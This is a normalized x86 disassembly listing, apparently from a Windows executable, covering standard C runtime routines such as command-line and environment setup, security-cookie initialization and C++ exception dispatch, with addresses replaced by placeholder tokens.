sub_44da24
mov edi edi
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
movzx eax [ esi ]
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax 0x3d
je r-xdata
push ebx
push 0x4
inc edi
push edi
call sub_445f7b
mov ebx eax
pop ecx
pop ecx
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_446dc2
pop ecx
lea esi [ esi + eax * 2 + 0x2 ]
inc edi
mov esi [ rw-data ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
pop ebx
push esi
call sub_446dc2
mov edi eax
inc edi
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_44120e
and [ rw-data ] 0x0
and [ ebx ] 0x0
mov [ rw-data ] 0x1
xor eax eax
lea esi [ esi + edi * 2 ]
push 0x2
push edi
call sub_445f7b
pop ecx
pop ecx
mov [ ebx ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_44120e
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push eax
call sub_45406e
add esp 0xc
test eax eax
je r-xdata
pop ecx
add ebx 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440669
add esp 0x14
sub_44db02
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
xor edx edx
push edi
mov edi [ ebp + 0xc ]
mov [ ebx ] edx
mov esi ecx
mov [ edi ] 0x1
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] esi
inc [ ebx ]
test esi esi
je r-xdata
mov edi [ ebp + 0xc ]
xor ecx ecx
test edx edx
sete cl
push 0x22
inc eax
inc eax
mov edx ecx
pop ecx
jmp r-xdata
movzx ecx [ eax ]
inc eax
inc eax
test cx cx
je r-xdata
mov cx [ eax ]
mov [ esi ] cx
inc esi
inc esi
test edx edx
jne r-xdata
dec eax
dec eax
jmp r-xdata
cmp cx 0x20
je r-xdata
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
cmp cx 0x9
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax edx
je r-xdata
movzx ecx [ eax ]
cmp cx 0x20
je r-xdata
xor ecx ecx
mov [ esi - 0x2 ] cx
inc [ edi ]
pop edi
pop esi
leave
retn
mov [ eax ] edx
inc eax
inc eax
jmp r-xdata
cmp cx 0x9
jne r-xdata
cmp [ eax ] dx
je r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
inc [ edi ]
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] esi
cmp [ eax ] 0x5c
je r-xdata
inc eax
inc eax
inc edx
cmp [ eax ] 0x22
jne r-xdata
test edx edx
jne r-xdata
test dl 0x1
jne r-xdata
dec edx
test esi esi
je r-xdata
movzx ecx [ eax ]
test cx cx
je r-xdata
shr edx 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc [ ebx ]
push 0x5c
pop ecx
mov [ esi ] cx
inc esi
inc esi
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] edx
jne r-xdata
xor ecx ecx
xor edi edi
cmp [ ebp - 0x4 ] ecx
sete cl
mov [ ebp - 0x4 ] ecx
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0x22
jne r-xdata
inc [ ebx ]
mov edi [ ebp + 0xc ]
jmp r-xdata
xor ecx ecx
mov [ esi ] cx
inc esi
inc esi
test edi edi
je r-xdata
cmp cx 0x20
je r-xdata
mov eax ecx
jmp r-xdata
xor edx edx
cmp [ eax ] dx
je r-xdata
inc eax
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp cx 0x9
je r-xdata
xor edi edi
inc edi
xor edx edx
jmp r-xdata
inc [ ebx ]
mov [ esi ] cx
inc esi
inc esi
sub_44dc53
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x104
mov esi rw-data
push esi
xor eax eax
xor ebx ebx
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
mov edi esi
mov edi eax
cmp [ eax ] bx
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x8 ]
cmp ecx 0x7fffffff
jae r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
lea ebx [ ebp - 0x8 ]
xor ecx ecx
mov eax edi
call sub_44db02
mov ebx [ ebp - 0x4 ]
pop ecx
pop ecx
cmp ebx 0x3fffffff
jae r-xdata
lea eax [ ecx + ebx * 2 ]
add eax eax
add ecx ecx
cmp eax ecx
jb r-xdata
push eax
call sub_445f36
mov esi eax
pop ecx
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ esi + ebx * 4 ]
push esi
lea ebx [ ebp - 0x8 ]
mov eax edi
call sub_44db02
mov eax [ ebp - 0x4 ]
dec eax
pop ecx
mov [ rw-data ] eax
pop ecx
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_44dd01
mov edi edi
push esi
call [ GetEnvironmentStringsW@IAT ]
mov esi eax
xor ecx ecx
cmp esi ecx
jne r-xdata
cmp [ esi ] cx
je r-xdata
xor eax eax
pop esi
retn
sub eax esi
inc eax
push ebx
inc eax
mov ebx eax
push edi
push ebx
call sub_445f36
mov edi eax
pop ecx
test edi edi
jne r-xdata
inc eax
inc eax
cmp [ eax ] cx
jne r-xdata
push ebx
push esi
push edi
call sub_443790
add esp 0xc
jmp r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax edi
pop edi
pop ebx
pop esi
retn
inc eax
inc eax
cmp [ eax ] cx
jne r-xdata
sub_44dd5e
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_44dd84
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_44ddaa
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_44de40
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_44de74
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_43fa93
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_44de9d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_43fb60
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43f960
pop ecx
sub_44dec4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_443c90
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_44df23
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_445601
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
call sub_445601
add eax 0x90
dec [ eax ]
call sub_445601
and [ eax + 0x90 ] 0x0
jmp sub_44b0de
sub_44df6c
push 0x10
push r--data
call sub_4433dc
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44e032
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_445601
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_443421
retn
call sub_44b12a
call sub_44b12a
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_44eb30
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_44e04d
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_445601
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_44e092
push 0x8
push r--data
call sub_4433dc
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_443421
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_442f29
mov [ ebp - 0x4 ] 0xfffffffe
sub_44e0e7
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_44e110
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_44b12a
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_44dec4
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_44e1d4
push 0x2c
push r--data
call sub_4433dc
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_4431d8
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_445601
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_445601
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_445601
mov [ eax + 0x88 ] esi
call sub_445601
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_44327d
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_44e2fa
mov eax [ ebp - 0x1c ]
call sub_443421
retn
sub_44e26d
mov esp [ ebp - 0x18 ]
call sub_445601
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_44df6c
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_44e2fa
mov eax [ ebp - 0x1c ]
call sub_443421
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_44e2fa
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_44322b
pop ecx
call sub_445601
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_445601
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_443204
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_44e092
pop ecx
pop ecx
sub_44e370
push 0xc
push r--data
call sub_4433dc
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_4540dd
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_4540dd
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_44b12a
push ebx
push esi
call sub_4540dd
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4540dd
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4540dd
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_4540dd
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_4540dd
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_4540dd
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_441f70
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_4540dd
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_44e0e7
pop ecx
pop ecx
push eax
push esi
call sub_441f70
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_443421
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_44e0e7
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_44e4ef
push 0x8
push r--data
call sub_4433dc
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_44e0e7
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_442f29
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_44e370
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_443421
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_44e0e7
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_442f29
jmp r-xdata
sub_44e581
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_44e4ef
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_442ef7
call sub_442f30
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_44df6c
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_44e1d4
add esp 0x28
test eax eax
je r-xdata
sub_44e5ef
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_445601
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_445601
lea edi [ eax + 0x80 ]
call sub_44536f
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_443163
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_44b12a
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_442fed
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_44e581
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_44e6e3
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_44b12a
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_445601
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_44b12a
call sub_44b0de
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_44e5ef
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_445601
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_445601
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_445601
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_4540dd
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_443163
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_44b12a
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_44e092
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_445601
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_445601
mov edi [ eax + 0x94 ]
call sub_445601
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_44e110
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_44e110
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_43fbd5
test al al
jne r-xdata
call sub_44b12a
cmp eax 0x19930522
jne r-xdata
call sub_445601
call sub_445601
call sub_445601
mov [ eax + 0x88 ] esi
call sub_445601
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_44dec4
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_44e092
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_44de74
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_442eab
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_44e581
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_442f30
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_44df6c
add esp 0x10
push [ esi + 0x1c ]
call sub_44e18b
sub_44ea47
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_445601
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_44e6e3
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
